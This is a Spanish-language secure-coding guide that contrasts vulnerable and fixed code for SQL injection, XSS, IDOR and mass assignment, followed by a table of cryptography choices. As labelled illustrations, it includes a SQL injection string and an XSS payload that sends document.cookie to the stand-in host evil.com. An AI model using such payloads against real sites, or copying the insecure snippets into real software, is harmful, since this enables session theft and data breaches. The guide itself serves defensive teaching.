La seguridad no es responsabilidad exclusiva de un equipo de seguridad. Es una propiedad del código que cada ingeniero escribe todos los días. Los vulnerabilidades más costosas de la historia no fueron ataques sofisticados — fueron errores básicos de validación de input, configuración incorrecta, o confianza implícita en datos externos.

OWASP Top 10: Los Bugs que Más Importan

1. SQL INJECTION: AÚN EL MÁS COMÚN Y EL MÁS EVITABLE

# ❌ SQL Injection — un bug que destruyó empresas enteras
user_input = request.GET.get('user_id')  # "1 OR 1=1 --"
query = f"SELECT * FROM users WHERE id = {user_input}"
# Resultado: SELECT * FROM users WHERE id = 1 OR 1=1 --
# Retorna TODOS los usuarios. Con DROP TABLE: elimina la BD.

# ✓ Parameterized queries — siempre, sin excepción
user_id = request.GET.get('user_id')
user = db.fetchone("SELECT * FROM users WHERE id = %s", (user_id,))
# El driver de BD escapa el parámetro automáticamente
# La query y los datos nunca se concatenan como strings

# ✓ ORM: parameterized por diseño
user = User.objects.get(id=user_id)  # Django — nunca inyectable
user = session.query(User).filter(User.id == user_id).first()  # SQLAlchemy

# Cuándo puede fallar incluso con ORM:
# raw() queries, execute() con f-strings, order_by() con input del usuario
# ❌ User.objects.raw(f"SELECT * FROM users ORDER BY {sort_field}")
# ✓  allowlist = ['name', 'email', 'created_at']
#    if sort_field not in allowlist: raise ValueError
#    User.objects.order_by(sort_field)

2. XSS: CROSS-SITE SCRIPTING

// ❌ XSS Reflejado: input del usuario insertado sin escapar en HTML
// URL: /search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>
const query = new URLSearchParams(window.location.search).get('q')
document.getElementById('results').innerHTML = `Results for: ${query}`
// El script se ejecuta en el navegador de la víctima
// Roba cookies, sessionStorage, LocalStorage, puede hacer requests como el usuario

// ✓ Escapar siempre el contenido dinámico
function escapeHtml(text: string): string {
  const div = document.createElement('div')
  div.textContent = text   // textContent escapa automáticamente
  return div.innerHTML
}
// Mejor: usar frameworks (React, Vue, Angular) que escapan por defecto
// dangerouslySetInnerHTML en React es la señal de alarma — nunca con input de usuario

// ✓ Content Security Policy: el seguro adicional
// Header HTTP que define de dónde puede cargar scripts el navegador:
// Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com
// Aunque el XSS se inyecte, el browser lo bloquea si no viene de la allowlist

3. INSECURE DIRECT OBJECT REFERENCE (IDOR)

# El bug de autorización más común — y el más fácil de introducir

# ❌ IDOR: cualquier usuario puede acceder a cualquier orden
@app.get("/orders/{order_id}")
async def get_order(order_id: int, current_user: User = Depends()):
    order = await Order.get(order_id)  # Falta verificar ownership!
    return order
# GET /orders/12345 → devuelve la orden 12345 aunque sea de otro usuario
# El atacante itera IDs: /orders/1, /orders/2, /orders/3...

# ✓ Siempre filtrar por el usuario autenticado
@app.get("/orders/{order_id}")
async def get_order(order_id: int, current_user: User = Depends()):
    order = await Order.get(id=order_id, user_id=current_user.id)
    if not order:
        raise HTTPException(status_code=404)  # 404, no 403 — no revelar existencia
    return order

# ✓ Para admins que SÍ pueden ver cualquier orden: verificar el rol explícitamente
@app.get("/admin/orders/{order_id}")
@require_role("admin")
async def admin_get_order(order_id: int, current_user: User = Depends()):
    return await Order.get(order_id)  # Admin puede ver cualquier orden

4. MASS ASSIGNMENT: EL BUG QUE COMPROMETIÓ GITHUB

# Mass assignment: el atacante envía campos que no debería poder modificar

# ❌ Mass assignment: aceptar todo el body directamente
@app.put("/users/me")
async def update_profile(body: dict, current_user: User = Depends()):
    await user_repo.update(current_user.id, **body)
# Un atacante envía: {"name": "John", "is_admin": true, "credits": 99999}
# El ORM actualiza todos esos campos sin discriminación

# ✓ Explicit DTOs: solo los campos permitidos pueden cambiar
from pydantic import BaseModel

class UpdateProfileDTO(BaseModel):
    name: str | None = None
    bio: str | None = None
    avatar_url: str | None = None
    # is_admin, credits, role → no están en el DTO → imposible modificarlos

@app.put("/users/me")
async def update_profile(body: UpdateProfileDTO, current_user: User = Depends()):
    await user_repo.update(current_user.id, body.model_dump(exclude_unset=True))

Cryptography Práctica: Cuándo Usar Qué

Necesidad Solución correcta Solución incorrecta Por qué importa
Almacenar contraseñas bcrypt, argon2, scrypt MD5, SHA-1, SHA-256, cifrado reversible bcrypt tiene trabajo configurable — lento por diseño para fuerza bruta
Comparar contraseñas/tokens hmac.compare_digest() o equivalente == o strcmp directo Comparación directa es vulnerable a timing attacks
Generar tokens seguros secrets.token_urlsafe() (Python), crypto.randomBytes() (Node) Math.random(), uuid v4 sin crypto Math.random() es predecible — no es criptográficamente seguro
Cifrar datos en tránsito TLS 1.2+ (configurado correctamente) TLS 1.0, SSL, cipher suites débiles Versiones antiguas tienen vulnerabilidades conocidas
Cifrar datos en reposo AES-256-GCM (cifrado autenticado) AES-ECB, DES, cifrado sin autenticación AES-ECB revela patrones en los datos. Sin autenticación: modificable sin detección
Firmar datos (JWT, webhooks) HMAC-SHA256 con clave secreta, RS256 con par de claves Algoritmo "none", MD5 alg:none es una vulnerabilidad clásica de JWT
Conexión técnica

La seguridad aplicada a nivel de código implementa los principios del modelo Zero Trust arquitectónico: validar cada input (nunca confiar en datos externos), autorización explícita en cada endpoint (IDOR), y mínimo privilegio (DTOs explícitos, no mass assignment). Las vulnerabilidades de seguridad no son problemas de arquitectura — son problemas de implementación que ninguna arquitectura puede prevenir por sí sola.
